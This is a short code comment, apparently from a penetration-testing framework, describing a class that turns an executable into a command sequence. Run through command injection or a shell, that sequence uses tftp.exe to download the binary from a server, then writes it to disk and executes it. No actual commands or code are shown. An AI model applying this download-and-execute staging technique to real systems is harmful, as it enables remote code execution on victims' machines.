###
#
# This class provides the ability to create a sequence of commands from an executable.
# When this sequence is ran via command injection or a shell, the resulting exe will
# be written to disk and executed.
#
# This particular version uses tftp.exe to download a binary from the specified
# server.  The original file is preserve, not encoded at all, and so this version
# is significantly simpler than other methods.
#
# Requires: tftp.exe, outbound udp connectivity to a tftp server
